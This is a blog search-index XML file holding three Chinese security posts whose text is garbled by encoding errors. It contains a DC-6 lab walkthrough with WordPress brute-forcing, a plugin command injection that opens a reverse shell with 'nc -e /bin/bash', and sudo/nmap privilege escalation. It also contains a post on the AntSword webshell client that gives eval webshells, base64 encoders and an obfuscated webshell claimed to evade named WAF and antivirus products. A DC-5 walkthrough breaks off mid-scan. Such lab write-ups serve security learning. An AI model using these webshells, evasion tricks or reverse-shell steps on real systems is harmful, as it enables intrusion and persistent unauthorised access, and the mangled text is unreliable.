<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DC6-é¶æœº</title>
      <link href="/posts/27cc.html"/>
      <url>/posts/27cc.html</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬ç¯å¢ƒæ­å»º"><a href="#åŸºæœ¬ç¯å¢ƒæ­å»º" class="headerlink" title="åŸºæœ¬ç¯å¢ƒæ­å»º"></a>åŸºæœ¬ç¯å¢ƒæ­å»º</h2><p> é¶æœºä¸‹è½½åœ°å€:<a href="https://download.vulnhub.com/dc/DC-6.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-6.zip</a></p><h2 id="åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a>åŸºæœ¬ä¿¡æ¯æ”¶é›†</h2><pre><code> nmap -sS -A 192.168.124.0/24</code></pre><pre><code> Nmap scan report for 192.168.124.150Host is up (0.00049s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Did not follow redirect to http://wordy/|_https-redirect: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:4C:2C:9C (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.49 ms 192.168.124.150</code></pre><p>å‘ç°å¼€æ”¾äº†80ï¼Œ22sshç«¯å£ï¼Œæ“ä½œç³»ç»Ÿlinux<br>å¯¹ç«¯å£è¿›ä¸€æ­¥æ‰«æ</p><pre><code>nmap -sS 192.168.124.150 -p 1-65535</code></pre><pre><code>Not shown: 65533 closed ports                                                                                                     PORT   STATE SERVICE                                                                                                              22/tcp open  ssh                                                                                                                  80/tcp open  http                                                                                                                     </code></pre><p>æ²¡æœ‰æ–°çš„ç«¯å£<br>çˆ†ç ´ä¸€ä¸‹ssh(çˆ†ç ´æœªæˆåŠŸ)</p><pre><code>nmap --script=ssh-brute 192.168.124.150</code></pre><h2 id="è®¿é—®80ç«¯å£"><a href="#è®¿é—®80ç«¯å£" class="headerlink" title="è®¿é—®80ç«¯å£"></a>è®¿é—®80ç«¯å£</h2><p>å‘ç°80ç«¯å£è®¿é—®ä¸äº†ï¼Œè¢«é‡å®šå‘çš„wordyé¡µé¢å’Œä¹‹å‰ä¸€æ ·<br>ä¿®æ”¹æœ¬åœ°çš„dns</p><pre><code>linux:vim /etc/hostswindows:C:\Windows\System32\drivers\etc</code></pre><p>æ·»åŠ </p><pre><code>192.168.124.150 wordy</code></pre><p>æ ¹æ®ä¸ªäººip<br>æ’ä»¶è¯†åˆ«æ˜¯ä¸€ä¸ªwordpress+apacheç¯å¢ƒ<br><img src="/images/pasted-236.png" alt="upload successful"><br>é‚£å’Œä¹‹å‰ä¸€æ ·ç”¨wpscanæ‰«æ</p><pre><code>wpscan --url http://wordy/ --enumerate u</code></pre><p>æ‰«æå‡ºå‡ ä¸ªç”¨æˆ·å</p><p><img src="/images/pasted-237.png" alt="upload successful"><br>å°†å…¶ä¿å­˜åˆ°usename.txtæ–‡ä»¶<br>ç„¶åæœ‰ä¸ªæç¤ºå¦ˆè€¶é¬¼èƒ½æƒ³åˆ°<br>æç¤ºåœ°å€:<a href="https://www.vulnhub.com/entry/dc-6,315/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-6,315/</a><br><img src="/images/pasted-238.png" alt="upload successful"></p><pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; password.txt</code></pre><p>ç„¶åè¿›è¡Œçˆ†ç ´</p><pre><code>wpscan --url http://wordy/ -U username.txt -P password.txt</code></pre><p><img src="/images/pasted-240.png" alt="upload successful"><br>æˆåŠŸçˆ†ç ´å‡ºè´¦å·å’Œå¯†ç </p><pre><code>mark / helpdesk01</code></pre><p>ç™»å½•åœ°å€</p><pre><code>http://wordy/wp-admin/</code></pre><p><img src="/images/pasted-241.png" alt="upload successful"><br>æœç´¢æ¼æ´:<br><a href="https://www.exploit-db.com/exploits/45274" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45274</a></p><p>å‘ç°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œæ¼æ´åœ°å€<br><a href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" target="_blank" rel="noopener">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</a><br><img src="/images/pasted-242.png" alt="upload successful"><br>kaliå¼€å¯ç›‘å¬ç«¯å£</p><pre><code>netcat -l -p 4444</code></pre><p>è¿™ä¸ªä½ç½®ä¿®æ”¹å‘½ä»¤æ‰§è¡Œåå¼¹shell<br><img src="/images/pasted-243.png" alt="upload successful"></p><pre><code>baidu.com | nc -e /bin/bash 192.168.124.139 4444</code></pre><p>åå¼¹ä¸€ä¸‹äº¤äº’shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-245.png" alt="upload successful"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨å®¶ç›®å½•å‘ç°æç¤ºçš„sshç™»å½•</p><pre><code>/home/mark/stuff</code></pre><p>å‘ç°ç™»å½•è´¦å·å¯†ç </p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>sshç™»å½•<br><img src="/images/pasted-246.png" alt="upload successful"><br>å°è¯•suidæå–,å‘ç°æ²¡æœ‰å¯åˆ©ç”¨çš„</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯æ‰§è¡Œæ“ä½œ</p><pre><code>sudo -l                                                                                    </code></pre><p><img src="/images/pasted-247.png" alt="upload successful"><br>å‘ç°å¯æ“ä½œ/home/jens/backups.shï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªè§£å‹çš„è„šæœ¬<br><img src="/images/pasted-248.png" alt="upload successful"><br>å‘å…¶ä¸­å†™å…¥å‘½ä»¤ç„¶åå·²jensæ¥æ‰§è¡Œ</p><pre><code>echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.shsudo -u jens /home/jens/backups.sh</code></pre><p><img src="/images/pasted-249.png" alt="upload successful"></p><p>å‘ç°æˆåŠŸåˆ‡æ¢åˆ°jensç”¨æˆ·<br>ç»§ç»­æŸ¥çœ‹å¯æ‰§è¡Œçš„å‘½ä»¤,å‘ç°å¯æ‰§è¡Œçš„rootçš„nmap</p><pre><code>sudo -l</code></pre><p><img src="/images/pasted-250.png" alt="upload successful"><br>æ‰€ä»¥éœ€è¦nmapæ‰“å¼€ä¸€ä¸ªshellå³å¯è·å¾—root</p><p>nmapä¸­æ‰§è¡Œshellæ–¹æ³•</p><pre><code>echo &quot;os.execute(&#39;/bin/bash&#39;)&quot;&gt;/tmp/shell.nsesudo nmap --script=/tmp/shell.nse</code></pre><pre><code>cat ./theflag.txt</code></pre><p>æˆåŠŸè·å¾—flag</p><pre><code>Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b  Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P   YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#39;    YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) Congratulations!!!Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èšå‰‘åŸç†ä¸é­”æ”¹</title>
      <link href="/posts/8e46.html"/>
      <url>/posts/8e46.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€å¥è¯æœ¨é©¬åŸç†"><a href="#ä¸€å¥è¯æœ¨é©¬åŸç†" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬åŸç†"></a>ä¸€å¥è¯æœ¨é©¬åŸç†</h2><p>ä¸€å¥è¯æœ¨é©¬å½¢å¦‚è¿™æ ·ï¼š</p><pre><code>&lt;?php @eval($_POST[password]);?&gt;</code></pre><p>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿æ¥æˆåŠŸ<br><img src="/images/pasted-216.png" alt="upload successful"><br>é‚£ä¸ºä»€ä¹ˆèƒ½æˆåŠŸå‘¢ï¼Ÿ<br>é¦–å…ˆè¦æ¢å¯»ä¸€å¥è¯æœ¨é©¬çš„åŸç†<br><img src="/images/pasted-217.png" alt="upload successful"><br>æ‰€ä»¥æˆ‘ä»¬postä¼ å…¥çš„å­—ç¬¦ä¸²ä¼šä»¥phpä»£ç çš„å½¢å¼è¿è¡Œï¼Œè€Œphpä»£ç åˆèƒ½è°ƒç”¨ç³»ç»Ÿæ“ä½œæ‰€ä»¥ä¾¿æˆäº†æœ¨é©¬<br><img src="/images/pasted-218.png" alt="upload successful"></p><h2 id="èšå‰‘çš„åŸç†"><a href="#èšå‰‘çš„åŸç†" class="headerlink" title="èšå‰‘çš„åŸç†"></a>èšå‰‘çš„åŸç†</h2><p>çŸ¥é“äº†ä¸€å¥è¯æœ¨é©¬çš„åŸç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº·åº·èšå‰‘çš„åŸç†ï¼Œèšå‰‘ç”¨å¾ˆå¤šåŠŸèƒ½ç¡®å®å¾ˆæ–¹ä¾¿ã€‚è¿˜æ”¯æŒç¼–ç ï¼Œåƒåœ¾æ•°å€¼ï¼Œéšæœºæ•°ï¼Œè‡ªå®šä¹‰ç¼–ç è§£ç å™¨ã€‚<br><img src="/images/pasted-219.png" alt="upload successful"><br>é¦–å…ˆé€‰æ‹©ä»£ç†è®¾ç½®ï¼Œå› ä¸ºè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç”¨burpsuiteæ¥æŠ“å–æµé‡ï¼Œ<br><img src="/images/pasted-220.png" alt="upload successful"><br><img src="/images/pasted-221.png" alt="upload successful"><br><img src="/images/pasted-222.png" alt="upload successful"><br>èšå‰‘è¿æ¥æ¥åˆ†æä¸€ä¸‹æµé‡</p><pre><code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out){    return $out;};function asoutput(){$output=ob_get_contents(); //è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ob_end_clean(); //æ¸…ç†(æ“¦é™¤)ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²echo &quot;c6b05fd97&quot;;echo @asenc($output);echo &quot;d69e35d304&quot;;}ob_start(); //æ‰“å¼€è¾“å‡ºç¼“å†²åŒºtry{$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); //è·å–å½“å‰urlè·¯ç”±çš„ç»å¯¹è·¯å¾„if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); //å½“å‰è„šæœ¬æ‰€åœ¨æ–‡ä»¶ç³»ç»Ÿï¼ˆéæ–‡æ¡£æ ¹ç›®å½•ï¼‰çš„åŸºæœ¬è·¯å¾„$R=&quot;{$D}    &quot;;if(substr($D,0,1)!=&quot;/&quot;){foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;{$L}:&quot;))$R.=&quot;{$L}:&quot;;}else{$R.=&quot;/&quot;;}$R.=&quot;    &quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;    {$s}&quot;;echo $R;;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die(); //è·å–ç›®å½•ï¼Œuidï¼Œç³»ç»Ÿä¿¡æ¯ï¼Œç”¨æˆ·ç­‰ä¿¡æ¯</code></pre><p>ç„¶åæˆ‘ä»¬å°±å¤§æ¦‚äº†è§£äº†ä¸€ä¸‹èšå‰‘çš„åŠŸèƒ½ï¼Œåœ¨åº·åº·èšå‰‘æ˜¯å¦‚ä½•è·å–æ•°æ®çš„<br><img src="/images/pasted-223.png" alt="upload successful"></p><pre><code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);            //ä¸æ˜¾ç¤ºæŠ¥é”™function asenc($out){return $out;};                               //ç”¨äºè¿”å›ä¿¡æ¯function asoutput(){$output=ob_get_contents();ob_end_clean();echo &quot;a170af01bc&quot;;            //ç”¨äºè¿”å›ä¿¡æ¯ï¼ŒåŒæ—¶åŠ å…¥å²é—´å‰ç¼€ï¼Œå¯¹å®‰å…¨ç‹—æ˜¯ä¸€ç§ç»•è¿‡echo @asenc($output);echo &quot;6d341a3c3a&quot;;}ob_start();                    try{$F=base64_decode(substr($_POST[&quot;hfdce8c1b4e4ef&quot;],2));      //base64è§£ç postä¼ å…¥çš„å¦ä¸€ä¸ªæ•°æ®$P=@fopen($F,&quot;r&quot;);                                        // è¿›è¡Œè¯»å–æ–‡ä»¶çš„æ“ä½œecho(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);;}catch(Exception $e){echo &quot;ERROR://&quot;.$e-&gt;getMessage();};asoutput();die();   //æŠ¥é”™ä¿¡æ¯</code></pre><p>åŸç†è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œä½†æ˜¯ä¸æ˜ç™½ä¸ºä»€ä¹ˆè¦ä»¤å¤–postä¸€ä¸ªæ•°æ®å†è¿›å»æ–‡ä»¶å†…çš„ä¼ é€’ï¼Œéš¾é“æ˜¯é¢å¯¹å¯¹è±¡ç¼–å†™çš„åŸå› ï¼Œè¿˜æ˜¯ä»¤æœ‰å¥½å¤„ï¼Œä½†æ˜¯å¦‚æœæ•´ä½“ä¸ªäººè§‰å¾—æ›´å®¹æ˜“æ··æ·†æµé‡ï¼Œä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåé¢è¿˜è¦ç¼–ç æ›´å¤šçš„å‚æ•°ï¼Œæ‰èƒ½ç»•è¿‡å®‰å…¨ğŸ•</p><h2 id="ç¼–ç å™¨åŸç†"><a href="#ç¼–ç å™¨åŸç†" class="headerlink" title="ç¼–ç å™¨åŸç†"></a>ç¼–ç å™¨åŸç†</h2><p>èšå‰‘è‡ªå¸¦å˜é‡ï¼Œæ”¯æŒæˆ‘ä»¬è‡ªå®šä¹‰ç¼–ç å’ŒåŠ å¯†æ–¹å¼æ¥æ··æ·†ä¼ å…¥çš„ä¸»å˜é‡(ä¸çŸ¥é“å«å•¥åå­—å°±å°±æ˜¯è¿æ¥å¯†ç çš„é‚£ä¸ªå˜é‡)çš„å‚æ•°<br><img src="/images/pasted-225.png" alt="upload successful"></p><pre><code>/** * php::base64ç¼–ç å™¨ * Create at: 2020/11/21 15:21:10 */&#39;use strict&#39;;/** @param  {String} pwd   è¿æ¥å¯†ç * @param  {Array}  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„* @return {Array}  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„*/module.exports = (pwd, data, ext={}) =&gt; {  // ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################  // ä»¥ä¸‹ä»£ç ä¸º PHP Base64 æ ·ä¾‹  // ç”Ÿæˆä¸€ä¸ªéšæœºå˜é‡å  let randomID = `_0x${Math.random().toString(16).substr(2)}`;  // åŸæœ‰çš„ payload åœ¨ data[&#39;_&#39;]ä¸­  // å–å‡ºæ¥ä¹‹åï¼Œè½¬ä¸º base64 ç¼–ç å¹¶æ”¾å…¥ randomID key ä¸‹  data[randomID] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ  data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;  // ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################  // åˆ é™¤ _ åŸæœ‰çš„payload  delete data[&#39;_&#39;];  // è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„  return data;}</code></pre><p>ä»£ç ä½œè€…å·²ç»ç»™äº†æ³¨é‡Šå¾ˆå¥½ç†è§£ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å¼€å¿ƒçš„æ„é€ è‡ªå·±çš„ç¼–ç æ–¹å¼æ¥ç»•è¿‡å®‰å…¨ç‹—äº†ã€‚</p><h2 id="å…æ€å°ä¾‹å­"><a href="#å…æ€å°ä¾‹å­" class="headerlink" title="å…æ€å°ä¾‹å­"></a>å…æ€å°ä¾‹å­</h2><p>è¿™é‡Œç»™äº†ä¾‹å­å§ã€‚ç›´æ¥ä½¿ç”¨åŒå±‚base64ï¼Œæˆ‘ä¸¢å°½ç„¶è¿˜èƒ½å…æ€(åæ¥æµ‹è¯•å‘ç°)ï¼Œå­¦é•¿èŠå¤©è¯´åŒbase64èƒ½è¿‡ğŸ•ï¼Œæˆ‘èµ·åˆä¸ä¿¡ï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸è¡Œã€‚å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å°è¯•ä¸€ä¸‹è¿˜æ˜¯ä¸è¡Œï¼Œç„¶åå‘ç°æ˜¯å› ä¸ºæˆ‘çš„webshellæ²¡æœ‰åšå…æ€å¤„ç†ï¼Œè¢«ğŸ•ç›´æ¥ç»™æ‰«å‡ºæ¥ï¼Œç„¶åå°±ä¸ç®¡ä½ çš„æµé‡äº†ç›´æ¥æ€ï¼Œwogiaoï¼ç‰›çš®ï¼ï¼<br>åŒbase64èšå‰‘ç¼–ç å™¨</p><pre><code>/** * php::base64ç¼–ç å™¨ * Create at: 2020/11/21 15:21:10 */&#39;use strict&#39;;/** @param  {String} pwd   è¿æ¥å¯†ç * @param  {Array}  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„* @return {Array}  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„*/module.exports = (pwd, data, ext={}) =&gt; {  // ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################  // ä»¥ä¸‹ä»£ç ä¸º PHP Base64 æ ·ä¾‹  // ç”Ÿæˆä¸€ä¸ªéšæœºå˜é‡å  let randomID = `_0x${Math.random().toString(16).substr(2)}`;  // åŸæœ‰çš„ payload åœ¨ data[&#39;_&#39;]ä¸­  // å–å‡ºæ¥ä¹‹åï¼Œè½¬ä¸º base64 ç¼–ç å¹¶æ”¾å…¥ randomID key ä¸‹  data[&#39;_&#39;] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ  //data[pwd] = `${data[&#39;_&#39;]}&quot;));`;  data[pwd] = Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);  // ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################  // åˆ é™¤ _ åŸæœ‰çš„payload  delete data[&#39;_&#39;];  // è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„  return data;}</code></pre><p>å…æ€çš„webshell</p><pre><code>&lt;?php header(&#39;HTTP/1.1 404&#39;);class COMI {     public $c=&#39;&#39;;    function __destruct() {        return eval(substr($this-&gt;c, 0));    }}$comi = new COMI();$password = &amp;$password1;$password1 = $_REQUEST[&#39;password&#39;];$post = &amp;$password;$post=base64_decode(base64_decode($post));$lnng1 = &amp;$lnng;$lnng = $post;$lnng2 = $lnng1;@$comi-&gt;c = substr($lnng2, 0);?&gt;</code></pre><p>webshellæ˜¯èƒ½å¤Ÿå…æ€å®‰å…¨ğŸ•å’ŒDç›¾å’ŒæŠ¤å«ç¥çš„ï¼Œå…¶ä»–çš„æ²¡æµ‹è¯•<br><img src="/images/pasted-227.png" alt="upload successful"><br><img src="/images/pasted-226.png" alt="upload successful"></p><h2 id="è§£ç å™¨åŸç†"><a href="#è§£ç å™¨åŸç†" class="headerlink" title="è§£ç å™¨åŸç†"></a>è§£ç å™¨åŸç†</h2><pre><code>/** * php::base64è§£ç å™¨ * Create at: 2020/11/21 17:15:24 */&#39;use strict&#39;;module.exports = {  /**   * @returns {string} asenc å°†è¿”å›æ•°æ®base64ç¼–ç    * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´   */  asoutput: () =&gt; {    return `function asenc($out){      return @base64_encode($out);    }    `.replace(/\n\s+/g, &#39;&#39;);  },  /**   * è§£ç  Buffer   * @param {string} data è¦è¢«è§£ç çš„ Buffer   * @returns {string} è§£ç åçš„ Buffer   */  decode_buff: (data, ext={}) =&gt; {    return Buffer.from(data.toString(), &#39;base64&#39;);  }}</code></pre><p>å®˜æ–¹æ³¨é‡Šå¾ˆæ¸…æ¥šè¿™é‡Œå°±ä¸å¼„äº†ï¼Œè€Œä¸”æˆ‘è§‰å¾—èšå‰‘è‡ªå¸¦çš„base64å•¥çš„è§£ç å™¨å®Œå…¨å¤Ÿç”¨ï¼Œæµé‡çš„æ··æ·†æ ¹æœ¬æ²¡æ³•çŒœï¼Œæœ‰éšæœºçš„å‰ç¼€åç¼€æ˜¯ä½ æ‰€ä¼ å‚çš„æ—¶å€™ä¼ è¿‡å»çš„ï¼Œæ‰€æœ‰æˆ‘æ²¡æ•´å°±è¿‡ğŸ•äº†ã€‚</p><h2 id="èšå‰‘RSA"><a href="#èšå‰‘RSA" class="headerlink" title="èšå‰‘RSA"></a>èšå‰‘RSA</h2><p><img src="/images/pasted-228.png" alt="upload successful"><br>RSAä¸€ç§åŸºäºå¯†ç å­¦çš„éå¯¹ç§°åŠ å¯†æ¥æ··æ·†æµé‡çš„æ–¹æ³•ï¼Œå…ˆç”¨ç§é’¥å¯¹è¦åŠ å¯†çš„ä¸œè¥¿è¿›è¡ŒåŠ å¯†ï¼Œç„¶åç”¨å…¬é’¥è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠå…¬é’¥æ”¾å…¥webshellé‡Œé¢ï¼Œå°±å¯å®ç°å¯¹æµé‡çš„æ··æ·†<br>RSAçš„åŸç†åˆ©ç”¨çš„æ˜¯æ•°è®ºä¸­çš„modè¿ç®—ï¼Œä¸å¯ç ´è§£çš„åŸå› å°±æ˜¯ä¸€ä¸ªå¤§æ•°ä¸æ˜“åˆ†è§£ä¸ºä¸¤ä¸ªç´ æ•°çš„ä¹˜ç§¯ï¼Œæ‰€ä»¥ä¾¿å¯å®ç°åŠ è§£å¯†ã€‚<br><img src="/images/pasted-229.png" alt="upload successful"><br>åŒæ ·çš„RSAæ··æ·†æµé‡å¯¹CTFçš„AWDæ¨¡å¼ä¹Ÿæœ‰å¥½å¤„ï¼Œå°±æ˜¯åˆ«äººæ²¡æ³•é€šè¿‡æŸ¥çœ‹è‡ªå·±çš„webshellï¼Œæ¥è¿æ¥å…¶ä»–çš„äººwebshellï¼Œå› ä¸ºä½ å¦‚æœèƒ½æ‰“ä¸‹æ¥ä¸å¯èƒ½åªç§ä¸€ä¸ªwebshell<br>å‚è€ƒ:<a href="https://xz.aliyun.com/t/4640" target="_blank" rel="noopener">å…ˆçŸ¥ç¤¾åŒº_ä»0åˆ°1æŒæ¡AWDæ”»é˜²ä¹‹RSAå¿…æ€</a></p><p>èšå‰‘çš„RSAä½¿ç”¨æ–¹å¼å¾ˆç®€å•<br>ä½¿ç”¨å‰æï¼Œç›®æ ‡è¦phpå¼€å¯sslï¼Œè¿™ä¸ªä¹Ÿæ˜¯è¿™ä¸ªåŠ å¯†æ–¹æ³•çš„ç¼ºé™·ï¼Œä¸å¼€å¯æ²¡æ³•è°ƒç”¨è§£å¯†å‡½æ•°</p><p>å¼€å¯opensslæ–¹æ³•<br>æ‰“å¼€iphp.ini<br>æœç´¢extension=php_openssl.dllï¼ŒæŠŠå‰é¢çš„åˆ†å·å–æ¶ˆ,ç„¶åé‡å¯webæœåŠ¡<br>åœ¨ç¼–ç å™¨çš„ä½ç½®<br><img src="/images/pasted-230.png" alt="upload successful"><br>ç„¶ååˆ›å»ºä¸€ä¸ª<br><img src="/images/pasted-231.png" alt="upload successful"><br><img src="/images/pasted-232.png" alt="upload successful"><br>ç„¶åå°†è¿™ä¸ªä½ç½®çš„webshellä¸Šä¼ ï¼Œå†™å…¥å•¥çš„å¼„åˆ°ç›®æ ‡<br><img src="/images/pasted-233.png" alt="upload successful"><br>ç„¶åè¿æ¥çš„æ—¶å€™é€‰æ‹©ä½ åˆ›å»ºçš„ç¼–ç å™¨å°±å¥½äº†ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå®‰å…¨ğŸ•å’ŒæŠ¤å«ç¥ä¸æ‹¦æˆªï¼ŒDç›¾å¯ä»¥æ‰«æå‡ºæ¥ä½†æ˜¯å±é™©ç­‰çº§ä¸é«˜ã€‚<br>å¯¹äºAWDctfåˆ©ç”¨èšå‰‘ä½œè€…é’ˆå¯¹RSAä¹ŸåŠ äº†ä¸€ä¸ªæ–¹æ³•<br>åœ¨RSAç¼–ç å™¨çš„ä½ç½®åŠ å…¥ä¸‹é¢ä»£ç ï¼Œä»€ä¹ˆä½œç”¨å‘¢ï¼Œåœ¨awdä¸­åˆ«äººæŠ“å–ä½ çš„webshellè¯»å–flagæµé‡è¿›è¡Œè½¬å‘åˆ°å…¶ä»–æœåŠ¡å™¨ä¸­ä¹Ÿå¯ä»¥è·å¾—flagï¼Œæ‰€ä»¥è¿™é‡Œè®¾ç½®æ—¶æ•ˆä¸º5ç§’ï¼Œå¯ä»¥è®¾ç½®æ›´çŸ­ã€‚</p><pre><code>data[&quot;_&quot;] = `if((time()-${parseInt((new Date().getTime())/1000)})&gt;5){die();};${data[&#39;_&#39;]}`;</code></pre><p><img src="/images/pasted-234.png" alt="upload successful"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://xz.aliyun.com/u/31536" target="_blank" rel="noopener">èšå‰‘æ”¹é€ è¿‡WAFç³»åˆ—</a></p><p><a href="https://xz.aliyun.com/u/20727" target="_blank" rel="noopener">èšå‰‘æ”¹é€ è®¡åˆ’</a></p><p><a href="https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw" target="_blank" rel="noopener">å­¦èšè‡´ç”¨</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èšå‰‘æ”¹é€  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC5-é¶æœº</title>
      <link href="/posts/328c.html"/>
      <url>/posts/328c.html</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºæœ¬ç¯å¢ƒçš„æ­å»º"><a href="#åŸºæœ¬ç¯å¢ƒçš„æ­å»º" class="headerlink" title="åŸºæœ¬ç¯å¢ƒçš„æ­å»º"></a>åŸºæœ¬ç¯å¢ƒçš„æ­å»º</h2><p>é¶æœºä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-5.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-5.zip</a></p><h2 id="åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a>åŸºæœ¬ä¿¡æ¯æ”¶é›†</h2><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.149Host is up (0.00027s latency).Not shown: 998 closed portsPORT    STATE SERVICE VERSION80/tcp  open  http    nginx 1.6.2|_http-server-header: nginx/1.6.2|_http-title: Welcome111/tcp open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          37412/udp   status|   100024  1          49448/tcp6  status|   100024  1          49885/udp6  status|_  100024 